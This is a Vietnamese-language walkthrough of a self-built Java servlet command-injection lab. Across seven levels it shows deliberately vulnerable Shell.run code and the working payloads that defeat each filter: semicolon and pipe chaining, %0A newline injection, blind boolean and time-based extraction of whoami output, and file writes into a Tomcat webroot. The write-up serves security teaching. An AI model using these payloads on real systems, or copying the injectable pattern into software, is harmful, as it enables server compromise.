---
title: Java Servlet Command Injection Vulnerability Challenges
categories: [pentesting, Web-Exploitation]
tags: [Web]
---

# Java Servlet Command Injection Vulnerability Challenges

### Cấu trúc Project

<summary>
Cấu trúc Project
</summary>

```text
+---.idea
+---.mvn
ª   +---wrapper
+---src
ª   +---main
ª   ª   +---java
ª   ª   ª   +---ci
ª   ª   ª       +---controller
ª   ª   ª       +---service
ª   ª   ª       +---util
ª   ª   +---resources
ª   ª   ª   +---META-INF
ª   ª   +---webapp
ª   ª       +---WEB-INF
ª   +---test
ª       +---java
ª       +---resources
+---target
    +---classes
    ª   +---ci
    ª   ª   +---controller
    ª   ª   +---service
    ª   ª   +---util
    ª   +---META-INF
    +---Command_Injection-1.0-SNAPSHOT
    ª   +---META-INF
    ª   +---WEB-INF
    ª       +---classes
    ª           +---ci
    ª           ª   +---controller
    ª           ª   +---service
    ª           ª   +---util
    ª           +---META-INF
    +---generated-sources
        +---annotations
```

-   <mark>LabServlet.java:</mark>Xử lý HTTP request
    với response thực hiện các tác vụ trên server và trả về kết quả cho
    người dùng.
-   <mark>LabService.java:</mark> Nơi đây là nơi xử lý
    logic chính của cả Web Application là nơi xử lý các level khác nhau.
-   <mark>Shell.java:</mark> Có nhiệm vụ thực thi các
    lệnh shell hoặc command-line từ chương trình Java và trả về kết quả
    của lệnh đó dưới dạng chuỗi.

#### Source Code:

[GitHub](https://github.com/pzhat/Command_Injection_Lab)

### Tiến hành Exploit và POC từng level

#### Level 1

<summary>
Level 1
</summary>

``` java
case 1:
    return Shell.run("nslookup " + input);
```

Đoạn code trên sẽ gọi qua Shell.java để xử lý OScommand

``` java
package ci.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class Shell {

    public static String run(String cmd) throws Exception {
        String[] command;

        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            // Windows: chạy qua powershell
            command = new String[]{"powershell.exe", "/c", cmd};
        } else {
            // Linux/Mac: chạy qua /bin/sh
            command = new String[]{"/bin/sh", "-c", cmd};
        }

        Process p = new ProcessBuilder(command)
                .redirectErrorStream(true)
                .start();

        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append('\n');
        }
        p.waitFor();
        return sb.toString();
    }
}
```

Đây là đoạn code Shell.java khi nó được gọi nó sẽ cho ta xử lý các
OScommand ở đây tôi làm cả 2 OS là Windows và Linux. Ở level đầu thì
cũng dễ để có thể khai thác vì ta có thể thấy rõ rằng cái sink nó nằm
ngay ở đoạn nó cho phép thực thi nslookup nhưng không hề chặn đi những
dấu giúp nối dài câu lệnh để thay đổi hành vi của nó.

![image](https://hackmd.io/_uploads/BJUxiR15xx.png) 

Ở đây ta test thử nhập google.com để xem nó có thực thi không và có thể thấy câu lệnh
nslookup có thực thi bây giờ ta sẽ thử nối dài nó và thực hiện chạy câu
lệnh `dir` để xem nó sẽ trả về gì.

![image](https://hackmd.io/_uploads/SkrkD1e5xx.png)

Vậy là với payload
`google.com ; ls` đã thực thi thành công nó trả về kết quả của cả câu
lệnh nslookup ở google.com và shell nó còn thực thi luôn cả câu lệnh
`dir` và dấu `;` là nhân tố nối dài câu lệnh giúp ta inject được thêm
những câu lệnh ngoài vào.

#### Level 2

<summary>

Level 2

</summary>

``` java
 case 2:
    if (input.contains(";")) return "Blocked: contains ';'";
    String pingCmd = isWin ? "ping -n 1 " + input : "ping -c 1 " + input;
    return Shell.run(pingCmd);
```

Đến với lv này thì có thể thấy rõ ràng là dấu `;` đã bị filter vì thế
payload cũ sẽ không còn hoạt động ở level này.

![image](https://hackmd.io/_uploads/rkz5vygqgl.png)

Vậy thì liệu ngoài
`;` ra thì powershell còn hỗ trợ kí tự nào có thể giúp ta nối dài câu
lệnh, sau một lúc tìm hiểu tôi chọn `|` hay còn gọi là pipeline để nối
dài câu lệnh thử xem liệu nó có được hay không.

![image](https://hackmd.io/_uploads/Bkjb31eqlx.png) 

Thành công với câu
inject `ls`.

#### Level 3

<summary>
Level 3
</summary>

``` java
 case 3:
    if (input.matches(".*[;&|].*")) return "Blocked: contains one of ; & |";
    return Shell.run("nslookup " + input);
```

Đến với level 3 có thể thấy rõ rằng 3 dấu `; & |` đã bị block vậy bây
giờ ta phải tìm cách khác để nối dài câu lệnh ra. Sau một lúc tìm hiểu
ta có thể lợi dụng url encode cùng với bảng hex để xuống dòng ở đây mình
dùng `%0A` .

    %0A là gì?
    Trong URL encoding:
    - Mỗi ký tự đặc biệt được mã hoá dưới dạng % + mã hex của nó theo bảng ASCII.
    - 0A trong hệ hex chính là số thập phân 10, tức là ký tự Line Feed (LF) — hay xuống dòng \n.

![image](https://hackmd.io/_uploads/H1FIrEg5el.png) 

Thành công thực thi
được câu lệnh `ls`.

#### Level 4


<summary>
Level 4
</summary>
Tới với level 4 thì nó sẽ giúp ta mô phỏng chức năng backup file.

``` java
private String winBackupStatus(String archiveName) throws Exception {
        String cmd = "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "
                + "\"Compress-Archive -Path 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' "
                + "-DestinationPath 'C:\\\\Users\\\\ADMIN\\\\IdeaProjects\\\\Backup\\\\" + archiveName + "' -Force; "
                + "if ($?) { 'OK' } else { 'ERROR' }\"";
        return Shell.run(cmd).trim();
    }
```

![image](https://hackmd.io/_uploads/ByT2DVl9gx.png)

![image](https://hackmd.io/_uploads/BkxguNeqee.png) 

Đây là nơi sẽ giúp
ta backup file zip nếu thành công nó trả về OK còn nếu không thì nó sẽ
trigger ERROR. Và ta có thể thấy rõ rằng là ở đây `cmd` đã rơi vào
`Shell.run` hay là Untrusted Data đã rơi vào Unsafe Method ta có thể
thấy rằng đây là một sink có thể khai thác được, việc bây giờ ta sẽ test
thử liệu shell có hoạt động hay không bằng lệnh `sleep`

![image](https://hackmd.io/_uploads/B1h22Ngqgx.png)

![image](https://hackmd.io/_uploads/rJX4TVgqle.png) 

Có thể thấy nó báo
lỗi nhưng câu lệnh sleep đã được thực thi thành công vì ở thời gian
response đã là hơn 5 giây. Vậy bây giờ ta sẽ tìm cách để đưa được
response ra được bên ngoài để đọc được nó ở đây mình dùng webhook cùng
với `Invoke-WebRequest` vì mình sử dụng powershell chứ không phải linux.

![image](https://hackmd.io/_uploads/H1wYzre9xx.png)

![image](https://hackmd.io/_uploads/r1B5MHgcxg.png) 

Kết quả curl nhảy
liên tục vì nó in ra từng dòng ở trong câu lệnh ls. Ở đây là mô phỏng
với trường hợp chỉ trả về kết quả OK hoặc ERROR và mình phải test trong
môi trường blind còn với chall này thì những payload như `;ls` vẫn sẽ
nhảy ra kết quả vì ở đây mình để nó in ra để debug.

![image](https://hackmd.io/_uploads/S1a7Qre5eg.png)

##### Level 5
<summary>
Level 5
</summary>
Đến với level 5 thì ở đây case của ta là vẫn là code của level 4 vẫn là
chức năng backup nhưng nếu mình đang ở trong môi trường no internet và
không dùng webhook để bắn kết quả ra được thì phải làm sao?

``` java
private String winBackupBoolean(String archiveName) throws Exception {
        String cmd = "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "
                + "\"$__ok = $false; "
                + "try { "
                + "  & { "
                + "    $ErrorActionPreference='SilentlyContinue'; "
                + "    Compress-Archive -Path 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' "
                + "      -DestinationPath C:\\\\Users\\\\ADMIN\\\\IdeaProjects\\\\Backup\\\\" + archiveName + " -Force; "
                + "    $__ok = $true; "
                + "  } > $null 2> $null 3> $null 4> $null 5> $null 6> $null | Out-Null "
                + "} catch { $__ok = $false } "
                + "if ($__ok) { 'OK' } else { 'FAIL' }\"";
        return Shell.run(cmd).trim();
    }
```

Ở đây vì là whitebox nên ta có thể thấy được đường dẫn bên trong nên ở
đây có 2 case có khả thi để có thể khai thác command injection. - Với
trường hợp đầu tiên là sử dụng bruteforce theo kiểu binary search để tìm
kí tự. Ở đây tôi sử dụng payload là
`heieiehehe; if ([int][char](whoami)[0] -gt 109) { Start-Sleep -Seconds 5 }`
đoạn đầu tôi sẽ tiến hành backup file có tên `heieiehehe` sau đó tiến
hành sử dụng điều kiện `if` kiểm tra giá trị đầu tiên của mảng sau khi
câu lệnh `whoami` được thực thi nếu nó lớn hơn `ascii = 109` là chữ m
thì nó sẽ sleep 5 giây.

![image](https://hackmd.io/_uploads/r1w-u5zcxl.png) 

Kết quả cho ra nó
hoàn toàn có sleep trên 5 giây vậy từ cách này ta hoàn toàn có thể brute
force ra được kết quả từng câu lệnh mình inject vào.

-   Còn với trường hợp thứ 2 thì giả thiết ở đây liệu ta có thể ghi một
    file vào document root và cho nó thực thi được không. Tiến hành
    inject payload
    `tududu; echo "pwned!" > D:\Web\apache-tomcat-10.1.43-windows-x64\apache-tomcat-10.1.43\webapps\ROOT\pwned.txt`
    để đưa file `pwned.txt` vào document root.
    ![image](https://hackmd.io/_uploads/BywCQJXcle.png)

    ![image](https://hackmd.io/_uploads/rkSJEym5ge.png) 

    Có thể thấy file
    được lưu vào Document Root.

    ![image](https://hackmd.io/_uploads/HyZZVyQ5gg.png) 

    Sau khi truy cập
    thấy có hiển thị vậy bây giờ ta sẽ thử chạy lệnh `whoami` rồi đẩy
    thử kết quả ra file txt.

    ![image](https://hackmd.io/_uploads/Hyib6kQqee.png) 

    Payload :
    `duddddmmy;+whoami+>+D%3a\Web\apache-tomcat-10.1.43-windows-x64\apache-tomcat-10.1.43\webapps\ROOT\whoami.txt`

    ![image](https://hackmd.io/_uploads/B1n4pJ7cxl.png) 
    
    Thành công.

#### Level 6

<summary>
Level 6
</summary>
Ở level này thì cách hoạt động của nó sẽ tương tự với level 5 nhưng chỉ
khác đây là trong trường hợp file được config dưới quyền RO `Read Only`
nghĩa là mình sẽ chỉ có quyền đọc file chứ không thể ghi vào file khác
như ở lv 5.

``` java
  private String winBackupNoStdout(String archiveName) throws Exception {
        String cmd = "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "
                + "\"$ProgressPreference='SilentlyContinue';"
                + "$ErrorActionPreference='SilentlyContinue';"
                + "Compress-Archive -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' "
                + "-DestinationPath D:\\\\IdeaProjects\\\\Backup\\\\" + archiveName + " -Force 2>&1\"";
        String out = Shell.run(cmd);
        return out.toLowerCase().contains("booleankey") ? "FAIL" : "SUCCESS";
    }
```

Với trường hợp read only ta sẽ không thể ghi file ra ngoài nhưng ở lv 5
ta đã tiếp cận với 1 hướng đi đó là Boolean Base ta sẽ thử áp dụng vào
trường hợp này. Ở đây ta sẽ lợi dụng chuỗi tín hiệu `booleankey` để thực
hiện in ra kết quả `Fail` hoặc `Success` tuỳ vào trường hợp.

![image](https://hackmd.io/_uploads/Hk2Y1KSclg.png) 

Với đoạn payload đầu
tiên là `x.zip; if((whoami)[0] -eq 'a'){ 'BooleanKey' } ;` ở đây nó sẽ
thực hiện so sánh vị trí thử 0 của kết quả câu lệnh whoami nếu nó là `a`
thì nó sẽ trả về fail và ngược lại nếu điều kiện sai kết quả sẽ trả về
success. 

![image](https://hackmd.io/_uploads/Bk7NgKBcex.png) 

Còn với
trường hợp vị trí 0 bằng `b` thì kết quả đã khác là nó đã trả về success
vì vậy điều kiện trên là false. Ở đây những payload trên hoạt động kiểu
vậy nhờ `BooleanKey` cái `BooleanKey` được mặc định nếu nằm trong câu
lệnh sẽ trả về Fail vậy nên ta lợi dụng nó để khi mà ta so sánh chuỗi
hoặc kí tự mà nó có tồn tại thì mình sẽ in cái `BooleanKey` ra và từ đó
nó sẽ trả về Fail có nghĩa là điều kiện đúng. Và ngược lại nếu trong câu
if true thì nó sẽ không in ra Fail vì cái booleankey sẽ nằm ở bên else.
</details>

#### Level 7

<summary>
Level 7
</summary>

Đến với level 7 thì cách hoạt động sẽ vẫn là backup file nhưng ở đây nó
sẽ khác đi là nó sẽ không còn trả về Fail hay Success mà chỉ trả về
`Đã chạy tác vụ` nên có thể thấy đây là trường hợp output silence.

``` java
  public void runLevel7Silent(String input) throws Exception {
        if (input == null) input = "";
        boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
        if (isWin) {
            String cmd = "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "
                    + "\"$ErrorActionPreference='SilentlyContinue'; "
                    + "Compress-Archive -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' "
                    + "-DestinationPath D:\\\\IdeaProjects\\\\Backup\\\\" + input + " -Force 2>&1\"";
            ci.util.Shell.run(cmd);
        } else {
            ci.util.Shell.run("timeout 3 zip /tmp/" + input + " -r /etc/hosts 2>&1");
        }
    }
```

![image](https://hackmd.io/_uploads/BJrzOYH5xl.png) 

Test thử payload cũ
thì nó chỉ hiển thị cho ta mỗi dòng này vậy nên bây giờ boolean base đã
bị vô tác dụng trước dạng output như này. Sau một lúc test thử thì ta
hoàn toàn có thể lợi dụng câu lệnh `sleep` để thực hiện time base nếu
điều kiện true sẽ sleep theo ý thích của mình nếu không thì response trả
về nhanh. Tiến hành test thử payload
`x.zip; Start-Sleep -Seconds 10 ; #` để xem nó có thực sự sleep không.

![image](https://hackmd.io/_uploads/BJ1jQqS5xl.png) 

Có thể thấy response
là 11 giây vậy là lệnh sleep có hiệu quả việc bây giờ là ta sẽ thử thêm
điều kiện vào. Bây giờ ta sử dụng payload giống lv6 nhưng chỉ sửa phần
boolean thành time
`x.zip; if((whoami)[0] -eq 'a'){ Start-Sleep -Seconds 10 } ; #`

![image](https://hackmd.io/_uploads/ryGYE5B9xl.png) 

Response time trên
10s chứng tỏ chữ đầu tiên của kết quả câu lệnh whoami là a từ đây ta
hoàn toàn có thể viết script để chạy để in ra full kết quả.

![image](https://hackmd.io/_uploads/HklAE5S9xl.png) 

Test thử với kí tự
thứ nhất bằng b thì response chỉ trong vòng 1 giây ta có thể kết luận
câu sleep 10 giây không thực thi nên là false.
